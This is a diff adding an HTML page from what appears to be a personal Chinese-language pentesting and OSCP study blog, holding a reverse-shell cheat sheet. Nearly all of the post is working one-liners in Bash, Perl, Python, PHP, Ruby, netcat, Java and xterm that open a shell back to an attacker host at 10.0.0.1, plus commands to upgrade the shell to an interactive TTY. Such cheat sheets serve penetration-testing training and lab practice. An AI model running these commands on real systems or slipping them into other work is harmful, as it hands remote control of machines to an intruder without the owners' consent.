@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.jpg" />
+    
+
+    <title>
+        
+          Reverse Shell - 阿毛毛の坑
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.jpg">
+    <span>阿毛毛の坑</span>
+  </a>
+</div>
+    <div id="menu" class="book-menu hide">
+  <h1 id="Initialized-on">Initialized on</h1>
+<h1 id="November-4-2020">November 4, 2020</h1>
+<h1 id="写点啥儿">写点啥儿</h1>
+<h1 id="">-</h1>
+<h1 id="WEAPONRY"><strong>[ WEAPONRY ]</strong></h1>
+<ul>
+<li><a href="/weaponry/kali/KALI-Deploy">KALI Deploy</a></li>
+<li><a href="/weaponry/kali/Common-Problems">Common Problems</a></li>
+<li><a href="/weaponry/commands/Reverse-Shell">Reverse Shell</a></li>
+</ul>
+<h1 id="-v2">-</h1>
+<h1 id="OSCP-BATTLE"><strong>[ OSCP BATTLE ]</strong></h1>
+<ul>
+<li><a href="/oscp/In-The-Beginning">In The Beginning</a></li>
+</ul>
+<h2 id="Prepration">Prepration</h2>
+<ul>
+<li><a href="/oscp/Training-Plan">Training Plan</a></li>
+</ul>
+<h2 id="Note">Note</h2>
+<ul>
+<li><a href="/oscp/Nmap-Tips">Nmap Tips</a></li>
+<li><a href="/oscp/Version-Compare">Version Compare</a></li>
+<li><a href="/oscp/Linux-Priv-Esc">Linux Priv Esc</a></li>
+</ul>
+<h1 id="-v3">-</h1>
+<h1 id="Hack-The-Box-Writeup"><strong>[ Hack The Box Writeup ]</strong></h1>
+<ul>
+<li><a href="/htb/HTB-Environment">HTB Environment</a></li>
+</ul>
+<h2 id="HTB-Linux">HTB Linux</h2>
+<ul>
+<li><a href="/htb/htb-linux/Lame-Writeup">Lame Writeup</a></li>
+<li><a href="/htb/htb-linux/Shocker-Writeup">Shocker Writeup</a></li>
+<li><a href="/htb/htb-linux/Bashed-Writeup">Bashed Writeup</a></li>
+<li><a href="/htb/htb-linux/Beep-Writeup">Beep Writeup</a></li>
+<li><a href="/htb/htb-linux/Nibbles-Writeup">Nibbles Writeup</a></li>
+<li><a href="/htb/htb-linux/Sense-Writeup">Sense Writeup</a></li>
+</ul>
+<h2 id="HTB-Windows">HTB Windows</h2>
+<ul>
+<li><a href="/">nothing here</a></li>
+</ul>
+<h1 id="-v4">-</h1>
+<h1 id="Cyber-Security"><strong>[ Cyber Security ]</strong></h1>
+<h2 id="Skills">Skills</h2>
+<ul>
+<li><a href="/">skills</a></li>
+</ul>
+<h2 id="Analize">Analize</h2>
+<ul>
+<li><a href="/">vuls</a></li>
+</ul>
+<h1 id="-v5">-</h1>
+<h1 id="Essay"><strong>[ Essay ]</strong></h1>
+<ul>
+<li><a href="/">该做题了</a></li>
+</ul>
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
+  <div class="sidebar-toggle-inner"></div>
+</div>
+
+<script>
+function add_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.add('show')  
+}
+
+function remove_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.remove('show')
+}
+
+function sidebar_toggle() {
+    let sidebar_toggle = document.querySelector('.sidebar-toggle')
+    let sidebar = document.querySelector('.book-sidebar')
+    let content = document.querySelector('.off-canvas-content')
+    if (sidebar_toggle.classList.contains('extend')) { // show
+        sidebar_toggle.classList.remove('extend')
+        sidebar.classList.remove('hide')
+        content.classList.remove('extend')
+    }
+    else { // hide
+        sidebar_toggle.classList.add('extend')
+        sidebar.classList.add('hide')
+        content.classList.add('extend')
+    }
+}
+</script>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <h1 id="反弹-shell">反弹 shell</h1>
+<blockquote>
+<p>升级成半交互式 tty</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">python -c <span class="token string">'import pty; pty.spawn("/bin/bash")'</span></code></pre>
+<p>升级成完全交互式 tty，能用方向键 + tab，就是退出比较麻烦。<strong>（在 KALI2020.3 上不成功，原因未知，可能跟 zsh 有关？）</strong></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">python -c <span class="token string">'import pty; pty.spawn("/bin/bash")'</span>
+Ctrl + Z
+stty raw -echo
+<span class="token function">fg</span>
+reset</code></pre>
+</blockquote>
+<h3 id="Bash">Bash</h3>
+<p>Tested on Ubuntu 10.10</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">/bin/bash -i <span class="token operator">>&amp;</span> /dev/tcp/10.0.0.1/1234 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span></code></pre>
+<h3 id="Perl">Perl</h3>
+<pre class="language-bash" data-language="bash"><code class="language-bash">perl -e <span class="token string">'use Socket;<span class="token variable">$i</span>="10.0.0.1";<span class="token variable">$p</span>=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(<span class="token variable">$p</span>,inet_aton(<span class="token variable">$i</span>))))&#123;open(STDIN,">&amp;S");open(STDOUT,">&amp;S");open(STDERR,">&amp;S");exec("/bin/sh -i");&#125;;'</span></code></pre>
+<h3 id="Python-2-7">Python 2.7</h3>
+<p>Tested under Linux / Python 2.7</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">python -c <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect<span class="token variable"><span class="token punctuation">((</span>"<span class="token number">10.0</span><span class="token number">.0</span><span class="token number">.1</span>"<span class="token punctuation">,</span><span class="token number">1234</span><span class="token punctuation">))</span></span>;os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></code></pre>
+<h3 id="PHP">PHP</h3>
+<p>This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn’t work, try 4, 5, 6…</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">php -r <span class="token string">'<span class="token variable">$sock</span>=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 >&amp;3 2>&amp;3");'</span></code></pre>
+<h3 id="Ruby">Ruby</h3>
+<pre class="language-bash" data-language="bash"><code class="language-bash">ruby -rsocket -e<span class="token string">'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d >&amp;%d 2>&amp;%d",f,f,f)'</span></code></pre>
+<h3 id="Netcat">Netcat</h3>
+<p>不一定所有 nc 都能用哦。</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> -e /bin/sh <span class="token number">10.0</span>.0.1 <span class="token number">1234</span>
+<span class="token function">nc</span> -e cmd.exe <span class="token number">10.0</span>.0.1 <span class="token number">1234</span></code></pre>
+<p>Netcat-openbsd 版不支持 -e，这时候用下面的。</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">rm</span> /tmp/f<span class="token punctuation">;</span><span class="token function">mkfifo</span> /tmp/f<span class="token punctuation">;</span><span class="token function">cat</span> /tmp/f<span class="token operator">|</span>/bin/sh -i <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span><span class="token operator">|</span><span class="token function">nc</span> <span class="token number">10.0</span>.0.1 <span class="token number">1234</span> <span class="token operator">></span>/tmp/f</code></pre>
+<h3 id="Java">Java</h3>
+<p>没测过。</p>
+<pre class="language-java" data-language="java"><code class="language-java">r <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+p <span class="token operator">=</span> r<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"exec 5&lt;>/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2>&amp;5 >&amp;5; done"</span><span class="token punctuation">]</span> as <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<h3 id="Xterm">Xterm</h3>
+<p>One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">xterm -display <span class="token number">10.0</span>.0.1:1</code></pre>
+<p>To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">Xnest :1</code></pre>
+<p>You’ll need to authorise the target to connect to you (command also run on your host):</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">xhost +targetip</code></pre>
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure class="avatar avatar-lg">
+          <img src="/favicon.jpg" alt="...">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>amm907</div>
+      <div>2020-11-23</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/WEAPONRY/">WEAPONRY</a>
+
+      
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
